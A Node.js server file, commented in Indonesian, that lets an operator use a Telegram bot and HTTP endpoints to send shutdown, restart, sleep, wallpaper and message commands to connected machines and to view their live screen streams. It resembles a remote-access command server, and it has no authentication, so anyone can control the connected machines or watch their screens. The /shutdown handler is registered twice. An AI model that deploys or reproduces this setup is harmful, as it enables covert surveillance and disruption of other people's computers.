require('dotenv').config();

const http = require('http');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const db = require('./db/connect');

// ================= CONFIG =================
const PORT = 9575;
const HOST = '0.0.0.0';
const BOT_TOKEN = process.env.BOT_TOKEN;

// ================= TELEGRAM =================
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
let users = new Set();

// ================= STORAGE =================
let clients = {};

// ================= HELPER =================
function sendToClient(clientId, data) {
    const client = clients[clientId];
    if (!client) return false;

    if (client.ws.readyState === WebSocket.OPEN) {
        client.ws.send(JSON.stringify(data));
        return true;
    }
    return false;
}

function broadcast(data) {
    let count = 0;

    Object.values(clients).forEach(client => {
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify(data));
            count++;
        }
    });

    return count;
}

function getLiveLinks(host) {
    return Object.keys(clients).map(id =>
        `https://${host}/client.html?kode=${id}`
    );
}

// ================= TELEGRAM =================

// START
bot.onText(/\/start/, (msg) => {
    users.add(msg.chat.id);

    bot.sendMessage(msg.chat.id,
        `🤖 BOT AKTIF

COMMAND:
/help
/client
/live
/msg <id> <text>
/shutdown <id>
/wallpaper <id>
/broadcast <text>`);
});

// HELP
bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id,
        `📖 COMMAND LIST:

/client → list client
/live → link live
/msg <id> <text>
/shutdown <id>
/wallpaper <id>
/broadcast <text>`);
});

// CLIENT LIST
bot.onText(/\/client/, (msg) => {
    const keys = Object.keys(clients);

    if (!keys.length) {
        return bot.sendMessage(msg.chat.id, "❌ Tidak ada client");
    }

    let text = "🖥 CLIENT ONLINE:\n\n";

    keys.forEach(id => {
        const viewers = clients[id].viewers.length;
        text += `${id} (👁 ${viewers})\n`;
    });

    bot.sendMessage(msg.chat.id, text);
});

// LIVE
bot.onText(/\/live/, (msg) => {
    const links = getLiveLinks("tele.chaerul.xyz");

    if (!links.length) {
        return bot.sendMessage(msg.chat.id, "❌ Tidak ada client");
    }

    bot.sendMessage(msg.chat.id, links.join("\n"));
});

// MESSAGE
bot.onText(/\/msg (.+)/, (msg, match) => {
    const args = match[1].split(" ");
    const id = args.shift();
    const text = args.join(" ");

    const ok = sendToClient(id, {
        type: 'command',
        action: 'msg',
        message: text
    });

    bot.sendMessage(msg.chat.id,
        ok ? `✅ Pesan ke ${id}` : `❌ Client tidak ditemukan`);
});

// BROADCAST
bot.onText(/\/broadcast (.+)/, (msg, match) => {
    const count = broadcast({
        type: 'command',
        action: 'msg',
        message: match[1]
    });

    bot.sendMessage(msg.chat.id,
        `📢 Broadcast ke ${count} client`);
});

// SHUTDOWN
bot.onText(/\/shutdown (.+)/, (msg, match) => {
    const id = match[1];

    const ok = sendToClient(id, {
        type: 'command',
        action: 'shutdown'
    });

    bot.sendMessage(msg.chat.id,
        ok ? `⚡ Shutdown ke ${id}` : `❌ Client tidak ditemukan`);
});
// ================= SHUTDOWN =================
bot.onText(/\/shutdown (.+)/, (msg, match) => {
    const id = match[1];

    const ok = sendToClient(id, {
        type: 'command',
        action: 'shutdown' // ✅ FIX
    });

    bot.sendMessage(msg.chat.id,
        ok ? `⚡ Shutdown ke ${id}` : `❌ Client tidak ditemukan`);
});

// ================= RESTART =================
bot.onText(/\/restart (.+)/, (msg, match) => {
    const id = match[1];

    const ok = sendToClient(id, {
        type: 'command',
        action: 'restart'
    });

    bot.sendMessage(msg.chat.id,
        ok ? `🔄 Restart ke ${id}` : `❌ Client tidak ditemukan`);
});

// ================= SLEEP =================
bot.onText(/\/sleep (.+)/, (msg, match) => {
    const id = match[1];

    const ok = sendToClient(id, {
        type: 'command',
        action: 'sleep'
    });

    bot.sendMessage(msg.chat.id,
        ok ? `😴 Sleep ke ${id}` : `❌ Client tidak ditemukan`);
});
// WALLPAPER COMMAND
bot.onText(/\/wallpaper (.+)/, (msg, match) => {
    const id = match[1];

    const ok = sendToClient(id, {
        type: 'command',
        action: 'wallpaper'
    });

    bot.sendMessage(msg.chat.id,
        ok ? `🖼 Request wallpaper ke ${id}` : `❌ Client tidak ditemukan`);
});

// TERIMA FOTO TELEGRAM
bot.on('photo', async (msg) => {

    const chatId = msg.chat.id;
    const file = msg.photo[msg.photo.length - 1];

    try {
        const fileLink = await bot.getFileLink(file.file_id);

        const target = msg.caption || Object.keys(clients)[0];

        if (!target || !clients[target]) {
            return bot.sendMessage(chatId, "❌ Client tidak ditemukan");
        }

        sendToClient(target, {
            type: 'command',
            action: 'wallpaper',
            url: fileLink
        });

        bot.sendMessage(chatId, `🖼 Wallpaper dikirim ke ${target}`);

    } catch (err) {
        bot.sendMessage(chatId, "❌ Gagal ambil file");
    }
});

// ================= HTTP =================
const server = http.createServer((req, res) => {
    // ================= SHUTDOWN (HTTP) =================
    if (req.url.startsWith('/shutdown')) {

        const url = new URL(req.url, `http://${req.headers.host}`);
        const clientId = url.searchParams.get('id');

        if (!clientId) {
            res.end("Gunakan ?id=client");
            return;
        }

        const ok = sendToClient(clientId, {
            type: 'command',
            action: 'shutdown'
        });

        res.end(ok ? "Shutdown terkirim" : "Client tidak ditemukan");
        return;
    }

    if (req.url.startsWith('/restart')) {

        const url = new URL(req.url, `http://${req.headers.host}`);
        const clientId = url.searchParams.get('id');

        if (!clientId) {
            res.end("Gunakan ?id=client");
            return;
        }

        const ok = sendToClient(clientId, {
            type: 'command',
            action: 'restart'
        });

        res.end(ok ? "restart terkirim" : "Client tidak ditemukan");
        return;
    }
    if (req.url.startsWith('/sleep')) {

        const url = new URL(req.url, `http://${req.headers.host}`);
        const clientId = url.searchParams.get('id');

        if (!clientId) {
            res.end("Gunakan ?id=client");
            return;
        }

        const ok = sendToClient(clientId, {
            type: 'command',
            action: 'sleep'
        });

        res.end(ok ? "sleep terkirim" : "Client tidak ditemukan");
        return;
    }

    // MESSAGE
    if (req.url.startsWith('/msg')) {
        const url = new URL(req.url, `http://${req.headers.host}`);
        const id = url.searchParams.get('id');
        const text = url.searchParams.get('text');

        if (!id || !text) {
            return res.end("Gunakan ?id=client&text=pesan");
        }

        if (id === 'all') {
            broadcast({
                type: 'command',
                action: 'msg',
                message: text
            });
            return res.end("Broadcast OK");
        }

        const ok = sendToClient(id, {
            type: 'command',
            action: 'msg',
            message: text
        });

        res.end(ok ? "OK" : "Client tidak ditemukan");
        return;
    }

    // CLIENT HTML
    if (req.url.startsWith('/client.html')) {
        const filePath = path.join(__dirname, 'client.html');

        fs.readFile(filePath, (err, data) => {
            if (err) return res.end("Error");

            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // LIVE LIST
    if (req.url === '/live') {
        const links = getLiveLinks(req.headers.host);
        res.end(links.join("\n") || "Tidak ada client");
        return;
    }

    res.end("🚀 Server aktif");
});

// ================= WSS =================
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {

    const ip = req.headers['cf-connecting-ip'] || req.socket.remoteAddress;
    const url = new URL(req.url, `http://${req.headers.host}`);
    const kode = url.searchParams.get('kode');

    let clientId = null;

    // VIEWER
    if (kode) {

        if (!clients[kode]) return ws.close();

        clients[kode].viewers.push(ws);

        ws.on('close', () => {
            clients[kode].viewers =
                clients[kode].viewers.filter(v => v !== ws);
        });

        return;
    }

    // CLIENT
    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg.toString());

            // REGISTER
            if (data.type === 'register') {

                const { hostname, platform } = data.data;
                clientId = hostname;

                clients[clientId] = {
                    ws,
                    viewers: []
                };

                const osName = `${platform} (${hostname})`;

                // DB CHECK
                db.query("SELECT * FROM clients WHERE os = ?", [osName], (err, results) => {

                    if (results.length > 0) {
                        db.query(`
                            UPDATE clients 
                            SET ip=?, status='online', connected_at=NOW(), disconnected_at=NULL
                            WHERE os=?`,
                            [ip, osName]);
                    } else {
                        db.query(`
                            INSERT INTO clients (ip, os, status)
                            VALUES (?, ?, 'online')`,
                            [ip, osName]);
                    }
                });

                console.log("🟢 Client online:", clientId);

                if (users.size > 0) {
                    bot.sendMessage([...users][0],
                        `🟢 CLIENT ONLINE\n\n${clientId}`);
                }
            }

            // SCREEN STREAM
            if (data.type === 'screen' && clientId) {
                const payload = JSON.stringify({
                    type: 'screen',
                    data: data.data
                });

                clients[clientId].viewers.forEach(v => {
                    if (v.readyState === WebSocket.OPEN) {
                        v.send(payload);
                    }
                });
            }

        } catch (err) {
            console.log("ERROR:", err);
        }
    });

    // DISCONNECT
    ws.on('close', () => {

        if (clientId && clients[clientId]) {

            delete clients[clientId];

            db.query(`
                UPDATE clients 
                SET status='offline', disconnected_at=NOW()
                WHERE os=?`, [clientId]);

            console.log("🔴 Client offline:", clientId);

            if (users.size > 0) {
                bot.sendMessage([...users][0],
                    `🔴 CLIENT OFFLINE\n\n${clientId}`);
            }
        }
    });
});

// ================= START =================
server.listen(PORT, HOST, () => {
    console.log(`🚀 Server jalan di http://${HOST}:${PORT}`);
});